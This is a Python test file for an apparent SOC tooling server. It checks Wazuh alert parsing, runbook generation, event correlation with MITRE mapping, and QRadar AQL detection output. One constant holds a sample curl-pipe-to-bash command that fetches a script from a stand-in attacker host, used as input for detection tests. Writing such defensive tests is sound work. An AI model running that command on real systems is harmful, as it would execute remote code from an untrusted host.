"""
Simple validation checks for the SOC MCP server tools.

Run from the project root:
    python scripts/test_soc_mcp_server.py

Or with the project venv:
    ./venv/bin/python scripts/test_soc_mcp_server.py
"""

import json
import sys
from pathlib import Path

# Import tools from soc_mcp_server.py in the same directory
sys.path.insert(0, str(Path(__file__).resolve().parent))
from soc_mcp_server import (  # noqa: E402
    correlate_security_events,
    generate_detection_package,
    generate_investigation_runbook,
    generate_qradar_aql_detection,
    investigate_command_execution,
    investigate_ssh_alert,
    parse_wazuh_alert,
)

WAZUH_ALERT_PATH = "sample_data/wazuh_alert.json"
SAMPLE_COMMAND = "curl http://evil.com/payload.sh | bash"

RUNBOOK_REQUIRED_KEYS = [
    "status",
    "runbook_title",
    "alert_type",
    "purpose",
    "required_inputs",
    "investigation_steps",
    "escalation_criteria",
    "containment_considerations",
    "detection_engineering_opportunities",
    "recommended_mcp_tools",
    "ticket_documentation_guidance",
    "analyst_note",
]

CORRELATION_REQUIRED_KEYS = [
    "status",
    "correlation_summary",
    "correlated_events",
    "attack_timeline",
    "possible_attack_chain",
    "mitre_mapping",
    "risk_level",
    "confidence_score",
    "escalation_recommendation",
    "detection_gaps",
    "recommended_next_steps",
    "analyst_note",
]

SSH_EVENT = {
    "event_type": "ssh_auth_failure",
    "timestamp": "2026-06-20T01:00:00Z",
    "source_ip": "192.168.1.50",
    "host": "ubuntu-agent",
    "username": "root",
    "severity": "high",
    "confidence_score": 80,
    "description": "Repeated SSH authentication failures",
}

AUTH_EVENT = {
    "event_type": "linux_auth_activity",
    "timestamp": "2026-06-20T01:05:00Z",
    "source_ip": "192.168.1.50",
    "host": "ubuntu-agent",
    "username": "root",
    "severity": "medium",
    "confidence_score": 60,
    "description": "Successful SSH login after repeated failures",
}

CMD_EVENT = {
    "event_type": "suspicious_command_execution",
    "timestamp": "2026-06-20T01:10:00Z",
    "source_ip": "192.168.1.50",
    "host": "ubuntu-agent",
    "username": "root",
    "severity": "high",
    "confidence_score": 85,
    "description": "Suspicious curl pipe to bash command execution",
}


def test_parse_wazuh_alert_returns_status_ok() -> None:
    """parse_wazuh_alert should return JSON with status 'ok'."""
    result_raw = parse_wazuh_alert(WAZUH_ALERT_PATH)
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert "observables" in result
    assert result["observables"]["source_ip"] == "192.168.1.50"


def test_investigate_ssh_alert_includes_required_sections() -> None:
    """investigate_ssh_alert should return a full triage package."""
    result_raw = investigate_ssh_alert(WAZUH_ALERT_PATH)
    result = json.loads(result_raw)

    required_keys = [
        "alert_summary",
        "risk_score",
        "investigation_summary",
        "recommended_queries",
        "next_action",
        "detection_recommendations",
        "investigation_runbook",
    ]

    for key in required_keys:
        assert key in result, f"Missing key: {key}"

    assert result["alert_summary"]["status"] == "ok"
    assert "severity" in result["risk_score"]
    assert "executive_summary" in result["investigation_summary"]
    assert "wazuh_opensearch" in result["recommended_queries"]
    assert "recommended_action" in result["next_action"]
    assert result["detection_recommendations"]["status"] == "ok"
    assert result["investigation_runbook"]["status"] == "ok"
    assert result["investigation_runbook"]["alert_type"] == "ssh_auth_failure"


def test_generate_investigation_runbook_ssh() -> None:
    """generate_investigation_runbook should return SSH runbook with required keys."""
    result_raw = generate_investigation_runbook(
        alert_type="ssh_auth_failure",
        severity="medium",
        confidence_score=60,
    )
    result = json.loads(result_raw)

    for key in RUNBOOK_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"

    assert result["status"] == "ok"
    assert result["alert_type"] == "ssh_auth_failure"
    steps_text = " ".join(result["investigation_steps"]).lower()
    assert "brute-force" in steps_text or "brute force" in steps_text
    assert "success-after-failure" in steps_text or "successful login after" in steps_text


def test_generate_investigation_runbook_command() -> None:
    """generate_investigation_runbook should return command execution runbook."""
    result_raw = generate_investigation_runbook(
        alert_type="suspicious_command_execution",
        severity="high",
        confidence_score=85,
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert result["alert_type"] == "suspicious_command_execution"
    steps_text = " ".join(result["investigation_steps"]).lower()
    assert "mitre" in steps_text
    assert "powershell" in steps_text
    assert "certutil" in steps_text


def test_generate_investigation_runbook_linux_auth() -> None:
    """generate_investigation_runbook should return linux auth activity runbook."""
    result_raw = generate_investigation_runbook(
        alert_type="linux_auth_activity",
        severity="medium",
        confidence_score=55,
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert result["alert_type"] == "linux_auth_activity"
    steps_text = " ".join(result["investigation_steps"]).lower()
    assert "failed login" in steps_text
    assert "publickey" in steps_text


def test_generate_investigation_runbook_unknown() -> None:
    """generate_investigation_runbook should return generic runbook for unknown types."""
    result_raw = generate_investigation_runbook(
        alert_type="unknown",
        severity="low",
        confidence_score=30,
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert result["alert_type"] == "unknown"
    steps_text = " ".join(result["investigation_steps"]).lower()
    assert "observable" in steps_text
    assert "enrichment" in steps_text or "enrich" in steps_text


def test_generate_investigation_runbook_unrecognized_type() -> None:
    """Unrecognized alert types should fall back to the unknown runbook."""
    result_raw = generate_investigation_runbook(
        alert_type="malware_alert",
        severity="medium",
        confidence_score=50,
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert result["alert_type"] == "unknown"
    assert "not recognized" in result["analyst_note"].lower()


def test_investigate_command_execution_includes_detection_recommendations() -> None:
    """investigate_command_execution should include detection_recommendations."""
    result_raw = investigate_command_execution(
        command=SAMPLE_COMMAND,
        hostname="ubuntu-agent",
        username="sysadmin",
        source_ip="192.168.1.50",
    )
    result = json.loads(result_raw)

    assert result["status"] == "ok"
    assert "detection_recommendations" in result
    assert result["detection_recommendations"]["status"] == "ok"
    assert len(result["detection_recommendations"]["recommended_detections"]) > 0


def _assert_correlation_shape(result: dict) -> None:
    for key in CORRELATION_REQUIRED_KEYS:
        assert key in result, f"Missing key: {key}"


def test_correlate_security_events_same_source_ip() -> None:
    """correlate_security_events should correlate events with the same source IP."""
    events = [
        SSH_EVENT,
        {
            **CMD_EVENT,
            "timestamp": "2026-06-20T02:00:00Z",
            "host": "other-host",
        },
    ]
    result = json.loads(correlate_security_events(events))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["confidence_score"] >= 50
    assert "Rule 1" in result["correlation_summary"]
    assert len(result["correlated_events"]) >= 2


def test_correlate_security_events_same_host() -> None:
    """correlate_security_events should correlate events on the same host."""
    events = [
        {**SSH_EVENT, "source_ip": "10.0.0.10"},
        {**AUTH_EVENT, "source_ip": "10.0.0.11"},
    ]
    result = json.loads(correlate_security_events(events))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["confidence_score"] >= 45
    assert "Rule 2" in result["correlation_summary"]
    assert len(result["correlated_events"]) == 2


def test_correlate_security_events_full_attack_chain() -> None:
    """correlate_security_events should detect SSH -> auth -> command chain."""
    result = json.loads(
        correlate_security_events([SSH_EVENT, AUTH_EVENT, CMD_EVENT])
    )
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["possible_attack_chain"] == [
        "Initial Access",
        "Valid Accounts",
        "Command Execution",
    ]
    technique_ids = [entry["technique_id"] for entry in result["mitre_mapping"]]
    assert technique_ids == ["T1110", "T1078", "T1059"]
    assert result["risk_level"] == "high"
    assert len(result["attack_timeline"]) == 3


def test_correlate_security_events_empty_list() -> None:
    """correlate_security_events should handle an empty event list gracefully."""
    result = json.loads(correlate_security_events([]))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["correlated_events"] == []
    assert result["risk_level"] == "low"
    assert result["confidence_score"] == 30


def test_correlate_security_events_unrelated_events() -> None:
    """correlate_security_events should treat unrelated events as low risk."""
    events = [
        {
            "event_type": "ssh_auth_failure",
            "timestamp": "2026-06-20T01:00:00Z",
            "source_ip": "10.1.1.1",
            "host": "host-a",
            "confidence_score": 35,
            "description": "SSH failures on host-a",
        },
        {
            "event_type": "suspicious_command_execution",
            "timestamp": "2026-06-20T04:00:00Z",
            "source_ip": "10.2.2.2",
            "host": "host-b",
            "confidence_score": 30,
            "description": "Command execution on host-b",
        },
    ]
    result = json.loads(correlate_security_events(events))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["risk_level"] == "low"
    assert result["possible_attack_chain"] == []
    assert result["correlated_events"] == []


def test_correlate_security_events_high_risk_scenario() -> None:
    """correlate_security_events should escalate a multi-event attack chain."""
    events = [SSH_EVENT, AUTH_EVENT, CMD_EVENT]
    result = json.loads(correlate_security_events(events))
    _assert_correlation_shape(result)

    assert result["status"] == "ok"
    assert result["risk_level"] == "high"
    escalation = result["escalation_recommendation"].lower()
    assert "escalate" in escalation or "containment" in escalation
    assert "Rule 7" in result["correlation_summary"]


def test_generate_qradar_aql_detection_ssh() -> None:
    """generate_qradar_aql_detection should return SSH brute-force AQL."""
    result_raw = generate_qradar_aql_detection(
        alert_type="ssh_auth_failure",
        severity="high",
    )
    result = json.loads(result_raw)

    required_keys = [
        "rule_name",
        "description",
        "severity",
        "mitre_mapping",
        "aql",
        "analyst_note",
    ]
    for key in required_keys:
        assert key in result, f"Missing key: {key}"

    assert "sshd" in result["aql"]
    assert "Failed password" in result["aql"]
    technique_ids = [entry["technique_id"] for entry in result["mitre_mapping"]]
    assert "T1110" in technique_ids


def test_generate_qradar_aql_detection_command() -> None:
    """generate_qradar_aql_detection should return command execution AQL."""
    result_raw = generate_qradar_aql_detection(
        alert_type="suspicious_command_execution",
        severity="medium",
    )
    result = json.loads(result_raw)

    assert "curl" in result["aql"]
    assert "powershell" in result["aql"]
    technique_ids = [entry["technique_id"] for entry in result["mitre_mapping"]]
    assert "T1105" in technique_ids


def test_generate_qradar_aql_detection_unsupported() -> None:
    """generate_qradar_aql_detection should handle unsupported alert types."""
    result_raw = generate_qradar_aql_detection(
        alert_type="unknown_alert",
        severity="low",
    )
    result = json.loads(result_raw)

    assert result["aql"] == ""
    assert "Unsupported alert_type" in result["analyst_note"]


def test_generate_detection_package_includes_qradar() -> None:
    """generate_detection_package should include qradar_aql_detection."""
    result_raw = generate_detection_package(
        alert_type="ssh_auth_failure",
        severity="high",
        confidence_score=85,
    )
    result = json.loads(result_raw)

    assert "qradar_aql_detection" in result
    assert result["qradar_aql_detection"]["aql"]
    assert "engineering_summary" in result


def main() -> None:
    test_parse_wazuh_alert_returns_status_ok()
    print("PASS: parse_wazuh_alert returns status ok")

    test_investigate_ssh_alert_includes_required_sections()
    print("PASS: investigate_ssh_alert includes required sections")

    test_generate_investigation_runbook_ssh()
    print("PASS: generate_investigation_runbook ssh_auth_failure")

    test_generate_investigation_runbook_command()
    print("PASS: generate_investigation_runbook suspicious_command_execution")

    test_generate_investigation_runbook_linux_auth()
    print("PASS: generate_investigation_runbook linux_auth_activity")

    test_generate_investigation_runbook_unknown()
    print("PASS: generate_investigation_runbook unknown")

    test_generate_investigation_runbook_unrecognized_type()
    print("PASS: generate_investigation_runbook unrecognized type fallback")

    test_investigate_command_execution_includes_detection_recommendations()
    print("PASS: investigate_command_execution includes detection_recommendations")

    test_correlate_security_events_same_source_ip()
    print("PASS: correlate_security_events same source IP")

    test_correlate_security_events_same_host()
    print("PASS: correlate_security_events same host")

    test_correlate_security_events_full_attack_chain()
    print("PASS: correlate_security_events full attack chain")

    test_correlate_security_events_empty_list()
    print("PASS: correlate_security_events empty list")

    test_correlate_security_events_unrelated_events()
    print("PASS: correlate_security_events unrelated events")

    test_correlate_security_events_high_risk_scenario()
    print("PASS: correlate_security_events high risk scenario")

    test_generate_qradar_aql_detection_ssh()
    print("PASS: generate_qradar_aql_detection ssh_auth_failure")

    test_generate_qradar_aql_detection_command()
    print("PASS: generate_qradar_aql_detection suspicious_command_execution")

    test_generate_qradar_aql_detection_unsupported()
    print("PASS: generate_qradar_aql_detection unsupported alert type")

    test_generate_detection_package_includes_qradar()
    print("PASS: generate_detection_package includes qradar_aql_detection")

    print("\nAll SOC MCP server checks passed.")


if __name__ == "__main__":
    main()
